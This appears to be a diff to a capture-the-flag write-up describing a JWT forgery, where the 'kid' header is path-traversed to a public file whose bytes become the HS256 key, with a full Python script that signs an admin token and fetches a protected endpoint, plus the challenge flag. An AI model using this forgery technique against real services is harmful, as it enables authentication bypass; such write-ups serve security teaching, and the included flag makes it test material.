@@ -4,10 +4,62 @@
 
 ## Solution
 
-1. I got a normal analyst JWT from `/token` and inspected its header and claims. The server's HMAC key-loading path depended on the JWT's `kid` header.
-2. I set `kid` to `../public/brand.txt`. That traversal pointed the verifier at a public file whose exact bytes I could download from `/public/brand.txt`.
-3. I used those unmodified bytes as the HS256 signing key and signed a token with `sub: analyst-recon-17` and `role: admin`, as recorded in my proof of concept. Knowing the file contents let me create a signature the server would accept.
-4. I sent the forged token as a Bearer token to `/admin/recovery-key`. My saved notes record an HTTP 200 response with the flag in `recovery_key`.
+### 1. Follow the JWT key lookup
+
+I got an analyst JWT from `/token` and checked its header and claims. The server used the header's `kid` value to choose the file containing the HMAC key.
+
+That made the key-loading path the useful input: I could choose a readable file whose contents were already public.
+
+### 2. Point kid at the public asset
+
+I used `../public/brand.txt` as `kid` and downloaded the same file through `/public/brand.txt`. I kept the response as raw bytes; decoding it or stripping a newline would change the HMAC key.
+
+The forged header was:
+
+```json
+{"alg": "HS256", "typ": "JWT", "kid": "../public/brand.txt"}
+```
+
+I kept the subject as `analyst-recon-17` and changed the role to `admin`.
+
+### 3. Sign the token and request the recovery key
+
+I Base64URL-encoded the header and payload without padding, joined them with a dot, and signed those bytes using HMAC-SHA256 and the unmodified asset bytes.
+
+I used this script, with the challenge base URL in `TARGET_URL`:
+
+```python
+import base64
+import hashlib
+import hmac
+import json
+import os
+from urllib.request import Request, urlopen
+
+BASE = os.environ["TARGET_URL"].rstrip("/")
+secret = urlopen(f"{BASE}/public/brand.txt").read()
+
+def b64url(blob):
+    return base64.urlsafe_b64encode(blob).rstrip(b"=").decode("ascii")
+
+def encode(part):
+    return b64url(json.dumps(part, separators=(",", ":")).encode())
+
+header = {"alg": "HS256", "typ": "JWT", "kid": "../public/brand.txt"}
+payload = {"sub": "analyst-recon-17", "role": "admin"}
+message = f"{encode(header)}.{encode(payload)}"
+signature = b64url(hmac.new(secret, message.encode(), hashlib.sha256).digest())
+token = f"{message}.{signature}"
+request = Request(
+    f"{BASE}/admin/recovery-key",
+    headers={"Authorization": f"Bearer {token}"},
+)
+print(urlopen(request).read().decode())
+```
+
+### 4. Read the protected response
+
+I sent the token to `/admin/recovery-key` as a Bearer token. The response was HTTP 200, with the flag in `recovery_key`.
 
 ## Flag
 
@@ -15,4 +67,4 @@
 CSCTF{3NKP02iqWOzaMj03hbWNlLLx}
 ```
 
-> **Note:** The complete success response is absent, and I did not replay the service. The successful route is recorded as `/admin/recovery-key`; an earlier brief names `/admin/flag`, so I kept the route from the successful solve notes.
+> **Note:** The briefing named `/admin/flag`; my successful request used `/admin/recovery-key`.
